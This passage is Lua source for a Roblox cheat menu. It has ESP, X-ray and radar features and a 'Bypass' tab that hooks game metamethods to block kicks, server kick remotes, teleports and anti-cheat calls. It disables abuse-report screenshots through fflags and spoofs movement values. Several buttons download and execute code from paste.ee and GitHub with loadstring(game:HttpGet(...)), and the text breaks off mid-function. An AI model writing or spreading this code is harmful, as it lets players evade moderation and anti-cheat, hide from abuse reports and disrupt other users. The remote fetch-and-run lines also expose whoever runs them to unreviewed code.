ESP:AddToggle({
	Name = "X-Ray",
	Default = false,
	Callback = function(Xray)
		if Xray == true then
              for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0.75
			end
		end
          else
			   Xray = false
               for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0
			end
		end
	end
  end    
})

ESP:AddButton({
	Name = "Arrow ESP",
	Callback = function()
	    -- Made by Blissful#4992
local DistFromCenter = 80
local TriangleHeight = 16
local TriangleWidth = 16
local TriangleFilled = false
local TriangleTransparency = 0
local TriangleThickness = 2
local TriangleColor = Color3.fromRGB(0, 255, 255)
local AntiAliasing = false
----------------------------------------------------------------
local Players = game:service("Players")
local Player = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local RS = game:service("RunService")
local V3 = Vector3.new
local V2 = Vector2.new
local CF = CFrame.new
local COS = math.cos
local SIN = math.sin
local RAD = math.rad
local DRAWING = Drawing.new
local CWRAP = coroutine.wrap
local ROUND = math.round
local function GetRelative(pos, char)
if not char then return V2(0,0) end
local rootP = char.PrimaryPart.Position
local camP = Camera.CFrame.Position
camP = V3(camP.X, rootP.Y, camP.Z)
local newcf = CF(rootP, camP)
local r = newcf:PointToObjectSpace(pos)
return V2(r.X, r.Z)
end
local function RelativeToCenter(v)
return Camera.ViewportSize/2 - v
end
local function RotateVect(v, a)
a = RAD(a)
local x = v.x * COS(a) - v.y * SIN(a)
local y = v.x * SIN(a) + v.y * COS(a)
return V2(x, y)
end
local function DrawTriangle(color)
local l = DRAWING("Triangle")
l.Visible = false
l.Color = color
l.Filled = TriangleFilled
l.Thickness = TriangleThickness
l.Transparency = 1-TriangleTransparency
return l
end
local function AntiA(v)
if (not AntiAliasing) then return v end
return V2(ROUND(v.x), ROUND(v.y))
end
local function ShowArrow(PLAYER)
local Arrow = DrawTriangle(TriangleColor)
local function Update()
local c 
c = RS.RenderStepped:Connect(function()
if PLAYER and PLAYER.Character then
local CHAR = PLAYER.Character
local HUM = CHAR:FindFirstChildOfClass("Humanoid")
if HUM and CHAR.PrimaryPart ~= nil and HUM.Health > 0 then
local _,vis = Camera:WorldToViewportPoint(CHAR.PrimaryPart.Position)
if vis == false then
local rel = GetRelative(CHAR.PrimaryPart.Position, Player.Character)
local direction = rel.unit
local base  = direction * DistFromCenter
local sideLength = TriangleWidth/2
local baseL = base + RotateVect(direction, 90) * sideLength
local baseR = base + RotateVect(direction, -90) * sideLength
local tip = direction * (DistFromCenter + TriangleHeight)
Arrow.PointA = AntiA(RelativeToCenter(baseL))
Arrow.PointB = AntiA(RelativeToCenter(baseR))
Arrow.PointC = AntiA(RelativeToCenter(tip))
Arrow.Visible = true
else Arrow.Visible = false end
else Arrow.Visible = false end
else
Arrow.Visible = false
if not PLAYER or not PLAYER.Parent then
Arrow:Remove()
c:Disconnect()
end
end
end)
end
CWRAP(Update)()
end
for _,v in pairs(Players:GetChildren()) do
if v.Name ~= Player.Name then
ShowArrow(v)
end
end
Players.PlayerAdded:Connect(function(v)
if v.Name ~= Player.Name then
ShowArrow(v)
end
end)
  	end    
})

ESP:AddButton({
	Name = "Player Radar",
	Callback = function()
	    -- Made by Blissful#4992
local Players = game:service("Players")
local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()
local Camera = game:service("Workspace").CurrentCamera
local RS = game:service("RunService")
local UIS = game:service("UserInputService")

repeat wait() until Player.Character ~= nil and Player.Character.PrimaryPart ~= nil

local LerpColorModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/main/LerpColorModule.lua"))()
local HealthBarLerp = LerpColorModule:Lerp(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0))

local function NewCircle(Transparency, Color, Radius, Filled, Thickness)
    local c = Drawing.new("Circle")
    c.Transparency = Transparency
    c.Color = Color
    c.Visible = false
    c.Thickness = Thickness
    c.Position = Vector2.new(0, 0)
    c.Radius = Radius
    c.NumSides = math.clamp(Radius*55/100, 10, 75)
    c.Filled = Filled
    return c
end

local RadarInfo = {
    Position = Vector2.new(200, 200),
    Radius = 100,
    Scale = 1, -- Determinant factor on the effect of the relative position for the 2D integration
    RadarBack = Color3.fromRGB(10, 10, 10),
    RadarBorder = Color3.fromRGB(75, 75, 75),
    LocalPlayerDot = Color3.fromRGB(255, 255, 255),
    PlayerDot = Color3.fromRGB(60, 170, 255),
    Team = Color3.fromRGB(0, 255, 0),
    Enemy = Color3.fromRGB(255, 0, 0),
    Health_Color = true,
    Team_Check = true
}

local RadarBackground = NewCircle(0.9, RadarInfo.RadarBack, RadarInfo.Radius, true, 1)
RadarBackground.Visible = true
RadarBackground.Position = RadarInfo.Position

local RadarBorder = NewCircle(0.75, RadarInfo.RadarBorder, RadarInfo.Radius, false, 3)
RadarBorder.Visible = true
RadarBorder.Position = RadarInfo.Position

local function GetRelative(pos)
    local char = Player.Character
    if char ~= nil and char.PrimaryPart ~= nil then
        local pmpart = char.PrimaryPart
        local camerapos = Vector3.new(Camera.CFrame.Position.X, pmpart.Position.Y, Camera.CFrame.Position.Z)
        local newcf = CFrame.new(pmpart.Position, camerapos)
        local r = newcf:PointToObjectSpace(pos)
        return r.X, r.Z
    else
        return 0, 0
    end
end

local function PlaceDot(plr)
    local PlayerDot = NewCircle(1, RadarInfo.PlayerDot, 3, true, 1)

    local function Update()
        local c 
        c = game:service("RunService").RenderStepped:Connect(function()
            local char = plr.Character
            if char and char:FindFirstChildOfClass("Humanoid") and char.PrimaryPart ~= nil and char:FindFirstChildOfClass("Humanoid").Health > 0 then
                local hum = char:FindFirstChildOfClass("Humanoid")
                local scale = RadarInfo.Scale
                local relx, rely = GetRelative(char.PrimaryPart.Position)
                local newpos = RadarInfo.Position - Vector2.new(relx * scale, rely * scale) 
                
                if (newpos - RadarInfo.Position).magnitude < RadarInfo.Radius-2 then 
                    PlayerDot.Radius = 3   
                    PlayerDot.Position = newpos
                    PlayerDot.Visible = true
                else 
                    local dist = (RadarInfo.Position - newpos).magnitude
                    local calc = (RadarInfo.Position - newpos).unit * (dist - RadarInfo.Radius)
                    local inside = Vector2.new(newpos.X + calc.X, newpos.Y + calc.Y)
                    PlayerDot.Radius = 2
                    PlayerDot.Position = inside
                    PlayerDot.Visible = true
                end

                PlayerDot.Color = RadarInfo.PlayerDot
                if RadarInfo.Team_Check then
                    if plr.TeamColor == Player.TeamColor then
                        PlayerDot.Color = RadarInfo.Team
                    else
                        PlayerDot.Color = RadarInfo.Enemy
                    end
                end

                if RadarInfo.Health_Color then
                    PlayerDot.Color = HealthBarLerp(hum.Health / hum.MaxHealth)
                end
            else 
                PlayerDot.Visible = false
                if Players:FindFirstChild(plr.Name) == nil then
                    PlayerDot:Remove()
                    c:Disconnect()
                end
            end
        end)
    end
    coroutine.wrap(Update)()
end

for _,v in pairs(Players:GetChildren()) do
    if v.Name ~= Player.Name then
        PlaceDot(v)
    end
end

local function NewLocalDot()
    local d = Drawing.new("Triangle")
    d.Visible = true
    d.Thickness = 1
    d.Filled = true
    d.Color = RadarInfo.LocalPlayerDot
    d.PointA = RadarInfo.Position + Vector2.new(0, -6)
    d.PointB = RadarInfo.Position + Vector2.new(-3, 6)
    d.PointC = RadarInfo.Position + Vector2.new(3, 6)
    return d
end

local LocalPlayerDot = NewLocalDot()

Players.PlayerAdded:Connect(function(v)
    if v.Name ~= Player.Name then
        PlaceDot(v)
    end
    LocalPlayerDot:Remove()
    LocalPlayerDot = NewLocalDot()
end)

-- Loop
coroutine.wrap(function()
    local c 
    c = game:service("RunService").RenderStepped:Connect(function()
        if LocalPlayerDot ~= nil then
            LocalPlayerDot.Color = RadarInfo.LocalPlayerDot
            LocalPlayerDot.PointA = RadarInfo.Position + Vector2.new(0, -6)
            LocalPlayerDot.PointB = RadarInfo.Position + Vector2.new(-3, 6)
            LocalPlayerDot.PointC = RadarInfo.Position + Vector2.new(3, 6)
        end
        RadarBackground.Position = RadarInfo.Position
        RadarBackground.Radius = RadarInfo.Radius
        RadarBackground.Color = RadarInfo.RadarBack

        RadarBorder.Position = RadarInfo.Position
        RadarBorder.Radius = RadarInfo.Radius
        RadarBorder.Color = RadarInfo.RadarBorder
    end)
end)()

-- Draggable
local inset = game:service("GuiService"):GetGuiInset()

local dragging = false
local offset = Vector2.new(0, 0)
UIS.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
        offset = RadarInfo.Position - Vector2.new(Mouse.X, Mouse.Y)
        dragging = true
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

coroutine.wrap(function()
    local dot = NewCircle(1, Color3.fromRGB(255, 255, 255), 3, true, 1)
    local c 
    c = game:service("RunService").RenderStepped:Connect(function()
        if (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
            dot.Position = Vector2.new(Mouse.X, Mouse.Y + inset.Y)
            dot.Visible = true
        else 
            dot.Visible = false
        end
        if dragging then
            RadarInfo.Position = Vector2.new(Mouse.X, Mouse.Y) + offset
        end
    end)
end)()

--[[ Example:
wait(3)
RadarInfo.Position = Vector2.new(300, 300)
RadarInfo.Radius = 150
RadarInfo.RadarBack = Color3.fromRGB(50, 0, 0)
]]
  	end    
})

Bypass:AddButton({
	Name = "Anti-Lag",
	Callback = function()
_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true -- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    Other = {
        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
        ["No Explosions"] = true, -- Makes Explosion's invisible
        ["No Clothes"] = true, -- Removes Clothing from the game
        ["Low Water Graphics"] = true, -- Removes Water Quality
        ["No Shadows"] = true, -- Remove Shadows
        ["Low Rendering"] = true, -- Lower Rendering
        ["Low Quality Parts"] = true -- Lower quality parts
    }
}
loadstring(game:HttpGet("https://paste.ee/r/WXhdX"))()
print("Anti-Lag loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Afk SendKeyEventMethod",
	Callback = function()
      	local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local Hooks = {}

local function SortArguments(self, ...)
    return self, {...}
end

local Old; Old = hookmetamethod(UserInputService.WindowFocused, "__index", function(...)
    local self, Index = ...
    local Response = Old(self, Index)

    if (tostring(self):find("WindowFocused") or tostring(self):find("WindowFocusReleased")) and not table.find(Hooks, Response) then
        table.insert(Hooks, Response)

        if Index:lower() == "wait" then
            local Old2; Old2 = hookfunction(Response, function(...)
                local self1 = ...

                if self1 == self then
                    self1 = Instance.new("BindableEvent").Event
                end

                return Old2(self1)
            end)
        elseif Index:lower() == "connect" then
            local Old2; Old2 = hookfunction(Response, function(...)
                local self1, Function = ...

                if self1 == self then
                    Function = function() return; end
                end

                return Old2(self1, Function)
            end)
        end
    end

    return Response
end)

for i, v in next, getconnections(UserInputService.WindowFocusReleased) do
    v:Disable()
end

for i, v in next, getconnections(UserInputService.WindowFocused) do
    v:Disable()
end

if not getgenv().WindowFocused then
    firesignal(UserInputService.WindowFocused)
    getgenv().WindowFocused = true
end

while true do
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Unknown, false, game)

    task.wait(Random.new():NextNumber(15, 120))
end

print("Anti-Afk SendKeyEventMethod Loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Afk ClickButtonMethod",
	Callback = function()
      	local VirtualUser=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)

print("Anti-Afk ClickButtonMethod Loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Afk KeyboardButtonMethod",
	Callback = function()
      	local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
print("Anti-Afk KeyboardButtonMethod Loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Cheat",
	Callback = function()
      	local mt = getrawmetatable(game)
local ncallsa = mt.__namecall
	setreadonly(mt, false)
	mt.__namecall = newcclosure(function(...)
		local args = {...}
		if not checkcaller() and getnamecallmethod() == "Cheat" then
			return nil
		end
		return ncallsa(...)
	end)
	setreadonly(mt, true)

print("Anti-Cheat Loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Kick",
	Callback = function()
      	local mt = getrawmetatable(game)
local ncallsa = mt.__namecall
	setreadonly(mt, false)
	mt.__namecall = newcclosure(function(...)
		local args = {...}
		if not checkcaller() and getnamecallmethod() == "Kick" then
			return nil
		end
		return ncallsa(...)
	end)
	setreadonly(mt, true)

print("Anti-Kick Loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Kick NewcclosureMethod",
	Callback = function()
      	local mt = getrawmetatable(game)
	local old = mt.__namecall
	local protect = newcclosure or protect_function

        setreadonly(mt, false)
	mt.__namecall = protect(function(self, ...)
		local method = getnamecallmethod()
		if method == "Kick" then
			wait(9e9)
			return
		end
		return old(self, ...)
	end)
	hookfunction(game.Players.LocalPlayer.Kick,protect(function() wait(9e9) end))
print("Anti-Kick NewcclosureMethod loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Kick HookFunctionMethod",
	Callback = function()
      	--// Variables

local Players = game:GetService("Players")
local OldNameCall = nil

--// Global Variables

getgenv().SendNotifications = true -- Set to true if you want to get notified regularly.

--// Anti Kick Hook

OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
    local NameCallMethod = getnamecallmethod()

    if tostring(string.lower(NameCallMethod)) == "kick" then
        
        return nil
    end
    
    return OldNameCall(Self, ...)
end)

if getgenv().SendNotifications == true then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Anti-Kick",
        Text = "Anti-Kick HookFunctionMethod script loaded",
        Icon = "rbxassetid://6238537240",
        Duration = 5,
    })
end
  	end    
})

Bypass:AddButton({
	Name = "Remote Anti-Kick",
	Callback = function()
      	local mt = getrawmetatable(game) --get meta

local oldnamecall = mt.__namecall --store namecall

setreadonly(mt, false) --make mt writeable

mt.__namecall = newcclosure(function(self, ...) --newcclosure yes
   local method = getnamecallmethod() --namecall
   local Args = {...} --args variable
   if not checkcaller() and method == "FireServer" and Args[1] == "Kick" then --This is where you put the Args, for example if the event were game.ReplicatedStorage.Anti:FireServer("Kick", "bad") you would do Args[1]. For bad you would do Args[2]
       return nil --most devs crash you so just do this, you can do this without wait.
   end
   
   return oldnamecall(self, ...) --return old
end)

setreadonly(mt, true)
print("Remote Anti-Kick loaded")
  	end    
})

Bypass:AddButton({
	Name = "Remote Anti-Kick WaitMethod",
	Callback = function()
      	local mt = getrawmetatable(game) --get meta

local oldnamecall = mt.__namecall --store namecall

setreadonly(mt, false) --make mt writeable

mt.__namecall = newcclosure(function(self, ...) --newcclosure yes
   local method = getnamecallmethod() --namecall
   local Args = {...} --args variable
   if not checkcaller() and method == "FireServer" and Args[1] == "Kick" then --This is where you put the Args, for example if the event were game.ReplicatedStorage.Anti:FireServer("Kick", "bad") you would do Args[1]. For bad you would do Args[2]
       return wait(math.huge) --most devs crash you so just do this, you can do this without wait.
   end
   
   return oldnamecall(self, ...) --return old
end)

setreadonly(mt, true)
print("Remote Anti-Kick WaitMethod loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-TeleportService",
	Callback = function()
      	local TeleportService, tp, tptpi = game:GetService("TeleportService")
	tp = hookfunction(TeleportService.Teleport, function(id, ...)
		if allow_rj and id == game.Placeid then
			return tp(id, ...)
		end
		return wait(9e9)
	end)
	tptpi = hookfunction(TeleportService.TeleportToPlaceInstance, function(id, server, ...)
		if allow_rj and id == game.Placeid and server == game.JobId then
			return tp(id, server, ...)
		end
		return wait(9e9)
	end)
print("Anti-TeleportService loaded")
  	end    
})

Bypass:AddButton({
	Name = "Position/CFrame Anti-Teleport",
	Callback = function()
      	local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__index

local player = game.Players.LocalPlayer
local IsLoop = false  
local CFrame = player.Character.HumanoidRootPart.CFrame

mt.__index = newcclosure(function(self, key)
    if self == "HumanoidRootPart" or self == "Torso" and self.Parent == player.Character and key == "CFrame" or key == "Position" and IsLoop then
        return CFrame
    end
    return old(self, key)
end)
print("Position/CFrame Anti-Teleport loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Reach",
	Callback = function()
      	for i,h in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			  if h:IsA("BasePart") then
               for i,v in pairs(getconnections(h:GetPropertyChangedSignal"Size")) do
                  v:Disable()
end
end
end
print("Anti-Reach loaded.")
print("Anti-Reach NOTE: If it's not work for you when you spawned as a new character, then use it again. There's no loop.")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Fling",
	Callback = function()
      	local Services = setmetatable({}, {__index = function(Self, Index)
			local NewService = game.GetService(game, Index)
			if NewService then
				Self[Index] = NewService
			end
			return NewService
		end})
	
		-- [ LocalPlayer ] --
		local LocalPlayer = Services.Players.LocalPlayer
	
		-- // Functions \\ --
		local function PlayerAdded(Player)
			local Detected = false
			local Character;
			local PrimaryPart;
	
			local function CharacterAdded(NewCharacter)
				Character = NewCharacter
				repeat
					wait()
					PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
				until PrimaryPart
				Detected = false
			end
	
			CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
			Player.CharacterAdded:Connect(CharacterAdded)
			Services.RunService.Heartbeat:Connect(function()
				if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
					if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
						if Detected == false then
							game.StarterGui:SetCore("ChatMakeSystemMessage", {
								Text = "Fling Exploit detected, Player: " .. tostring(Player);
								Color = Color3.fromRGB(255, 200, 0);
							})
						end
						Detected = true
						for i,v in ipairs(Character:GetDescendants()) do
							if v:IsA("BasePart") then
								v.CanCollide = false
								v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
								v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
								v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
							end
						end
						PrimaryPart.CanCollide = false
						PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
						PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
						PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
					end
				end
			end)
		end
	
		-- // Event Listeners \\ --
		for i,v in ipairs(Services.Players:GetPlayers()) do
			if v ~= LocalPlayer then
				PlayerAdded(v)
			end
		end
		Services.Players.PlayerAdded:Connect(PlayerAdded)
	
		local LastPosition = nil
		Services.RunService.Heartbeat:Connect(function()
			pcall(function()
				local PrimaryPart = LocalPlayer.Character.PrimaryPart
				if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
					PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
					PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
					PrimaryPart.CFrame = LastPosition
	
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "You were flung. Neutralizing velocity.";
						Color = Color3.fromRGB(255, 0, 0);
					})
				elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
					LastPosition = PrimaryPart.CFrame
				end
			end)
		end)
print("Anti-Fling loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Network Library",
	Callback = function()
      	repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players") --define variables n shit
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
--[[
Network Library by 4eyes
Usage: Put this in your script and use Network.RetainPart(Part) on any part you'd like to retain ownership over, then just apply a replicating method of movement. Credit me if you'd like.
loadstring(game:HttpGet("https://raw.githubusercontent.com/your4eyes/RobloxScripts/main/Net_Library.lua"))()
--]]
if not getgenv().Network then
    getgenv().Network = {}
    Network["BaseParts"] = {}
    Network["RetainPart"] = function(Part) --function for retaining ownership of unanchored parts
        if Part:IsA("BasePart") and not isnetworkowner(Part) then
            local CParts = Part:GetConnectedParts()
            for _,CPart in pairs(CParts) do --check if part is connected to anything already in baseparts being retained
                if table.find(Network["BaseParts"],CPart) then
                    print("Did not apply PartOwnership to part, as it is already connected to a part with this method active.")
                    return
                end
            end
            local BV = Instance.new("BodyVelocity") --create bodyvelocity to apply constant physics packets and retain ownership
            BV.Name = "NetworkRetainer"
        BV.MaxForce = Vector3.new(1/0,1/0,1/0)
            BV.P = 1/0
            BV.Velocity = Vector3.new(30,30,30)
            BV.Parent = Part
            table.insert(Network["BaseParts"],Part)
        end
    end
    Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
    setfflag("NewRunServiceSignals","true")
    for _,Event in pairs({RunService.RenderStepped,RunService.Heartbeat,RunService.Stepped,RunService.PreSimulation,RunService.PostSimulation}) do
        Event:Connect(function()
            return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
        end)
    end
    Network["PartOwnership"] = {}
    Network["PartOwnership"]["Enabled"] = false
    Network["PartOwnership"]["Execute"] = coroutine.create(function() --creating a thread for network stuff
        if Network["PartOwnership"]["Enabled"] == false then
            Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
            setscriptable(workspace,"PhysicsSteppingMethod",true)
            setscriptable(workspace,"PhysicsSimulationRateReplicator",true)
            settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
            workspace.PhysicsSimulationRateReplicator = Enum.PhysicsSimulationRate.Fixed240Hz
            workspace.InterpolationThrottling = Enum.InterpolationThrottling.Enabled
            workspace.PhysicsSteppingMethod = Enum.PhysicsSteppingMethod.Fixed
            LocalPlayer.ReplicationFocus = workspace
            settings().Physics.AllowSleep = false
            Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
                sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
                for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
                    coroutine.wrap(function()
                        if not isnetworkowner(Part) then --lag parts my ownership is contesting but dont have network over to spite the people who have ownership of stuff i want >:(
                            print("[NETWORK] Part "..Part:GetFullName().." is not owned. Contesting ownership...")
                            sethiddenproperty(Part,"NetworkIsSleeping",true)
                        else
                            sethiddenproperty(Part,"NetworkIsSleeping",false)
                        end
                        --[==[ [[by 4eyes btw]] ]==]--
                    end)()
                end
            end)
        end
    end)
    coroutine.resume(Network["PartOwnership"]["Execute"])
end
  	end    
})

Bypass:AddButton({
	Name = "Anti-Net",
	Callback = function()
      	for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(45,0,0)
end)
end
end
print("Anti-Net loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Netless",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/E8tES"))()
        print("Anti-Netless loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Report",
	Callback = function()
      	setfflag("AbuseReportScreenshotPercentage", 0)
setfflag("DFFlagAbuseReportScreenshot", "False")
print("Anti-Report loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-DisplayName",
	Callback = function()
	    local AntiDisplayName = loadstring(game:HttpGet('https://paste.ee/r/j7ZgJ'))(function()
    getgenv().Preferences = {}
end)

Preferences = {
    RetroNaming = false,
    ShowOriginalName = true,
    ApplyToLeaderboard = true,
    IdentifyFriends = {Toggle = true, Identifier = '[Friend]'},
    IdentifyBlocked = {Toggle = true, Identifier = '[Blocked]'},
    IdentifyPremium = {Toggle = true, Identifier = '[Premium]'},
    IdentifyDeveloper = {Toggle = true, Identifier = '[Game Dev]'},
    SpoofLocalPlayer = {Toggle = false, UseRandomName = true, NewName = 'Random Name Lol'},
    Orientation = 'Horizontal'
}
print("Anti-DisplayName loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Hat",
	Callback = function()
      	local client = game:GetService("Players").LocalPlayer
local char = client.Character
local antihat = true

for _,delete in pairs(char:GetChildren()) do
    if delete:IsA('Accessory') then
        delete.Handle:Destroy()
    end
end

client.CharacterAdded:Connect(function()
repeat wait()
    for i,v in pairs(char:GetChildren()) do
        if v:IsA("Accessory") then
           wait(1)
           v.Handle:Destroy()
        end
    end
until antihat == false
end)
print("Anti-Hat loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-Body Movers",
	Callback = function()
local client = game:GetService("Players").LocalPlayer
local char = client.Character
local antibody = true

for _,v in pairs(char:GetDescendants()) do
    if v:IsA("BodyAngularVelocity") or v:IsA("BodyForce") or v:IsA("BodyGyro") or v:IsA("BodyThrust") or v:IsA("BodyVelocity") or v:IsA("BodyPosition") or v:IsA("RocketPropulsion") then
        v:Destroy()
    end
end

repeat wait()
      	for _,v in pairs(char:GetDescendants()) do
    if v:IsA("BodyAngularVelocity") or v:IsA("BodyForce") or v:IsA("BodyGyro") or v:IsA("BodyThrust") or v:IsA("BodyVelocity") or v:IsA("BodyPosition") or v:IsA("RocketPropulsion") then
        v:Destroy()
    end
end
until antibody == false

print("Anti-Body Movers loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-WalkSpeed",
	Callback = function()
      	local gmt = getrawmetatable(game)
 
        local oldindex = gmt._index

setreadonly(gmt, false)
 
gmt._index = newcclosure(function(self,k)
    if self == "Humanoid" and k == "WalkSpeed" then
        return 16
    end
    return oldindex(self,k)
end)
setreadonly(gmt, true)
print("Anti-WalkSpeed loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-JumpPower",
	Callback = function()
      	local gmt = getrawmetatable(game)
 
        local oldindex = gmt._index

setreadonly(gmt, false)
 
gmt._index = newcclosure(function(self,k)
    if self == "Humanoid" and k == "JumpPower" then
        return 50
    end
    return oldindex(self,k)
end)
setreadonly(gmt, true)
print("Anti-JumpPower loaded")
  	end    
})

Bypass:AddButton({
	Name = "Anti-HipHeight",
	Callback = function()
      	local gmt = getrawmetatable(game)
 
        local oldindex = gmt._index

setreadonly(gmt, false)
 
gmt._index = newcclosure(function(self,k)
    if self == "Humanoid" and k == "HipHeight" then
        return 0
    end
    return oldindex(self,k)
end)
setreadonly(gmt, true)
print("Anti-Height loaded")
  	end    
})

Bypass:AddTextbox({
	Name = "Anti-WaitCooldown",
	Default = "",
	TextDisappear = true,
	Callback = function(JPNumber)
		local OldH; OldH = hookfunction(wait, function(w)

local NumberDelay = tonumber(JPNumber)

if w == NumberDelay then
   return 0
end

return OldH(w)

end)
print("Anti-WaitCooldown loaded")
	end	  
})

Function:AddLabel("Functions")

local BasePart

Function:AddDropdown({ --- Or local Dropdown = Tab:AddDropdown({
	Name = "Touch Part Method",
	Default = "HumanoidRootPart",
	Options = {"HumanoidRootPart", "Torso", "Head", "Right Arm", "Left Arm", "RightHand", "LeftHand", "Right Leg", "Left Leg", "RightFoot", "LeftFoot"}, --- Can add more, example Options = {"1", "2", "3", "4", "5"}, also you can name of these numbers to random word or number.
	Callback = function(ChoosePart)
		if ChoosePart == "HumanoidRootPart" then --- Or "1" idk lol
            BasePart = "HumanoidRootPart"
            elseif ChoosePart == "Torso" then --- Or "2"
            BasePart = "Torso"
            elseif ChoosePart == "Head" then --- Or "2"
            BasePart = "Head"
            elseif ChoosePart == "Right Arm" then --- Or "2"
            BasePart = "Right Arm"
            elseif ChoosePart == "Left Arm" then --- Or "2"
            BasePart = "Left Arm"
            elseif ChoosePart == "RightHand" then --- Or "2"
            BasePart = "RightHand"
            elseif ChoosePart == "LeftHand" then --- Or "2"
            BasePart = "LeftHand"
            elseif ChoosePart == "Right Leg" then --- Or "2"
            BasePart = "Right Leg"
            elseif ChoosePart == "Left Leg" then --- Or "2"
            BasePart = "Left Leg"
            elseif ChoosePart == "RightFoot" then --- Or "2"
            BasePart = "RightFoot"
            elseif ChoosePart == "LeftFoot" then --- Or "2"
            BasePart = "LeftFoot"
	end
  end    
})

Function:AddToggle({
	Name = "Loop Fire Closest TouchInterest",
	Default = false,
	Callback = function(ClosestTouch)
		if ClosestTouch == true then

        if closesttouch ~= nil then
                  closesttouch:Disconnect()
               end

function TouchPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       firetouchinterest(plr.Character[BasePart], Part, 0)
       task.wait()
       firetouchinterest(plr.Character[BasePart], Part, 1)
   end
end

closesttouch = game:GetService("RunService").Stepped:Connect(function()
 
for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("TouchTransmitter") then
          for i,b in pairs(v.Parent:GetChildren()) do
              if b:IsA("BasePart") then
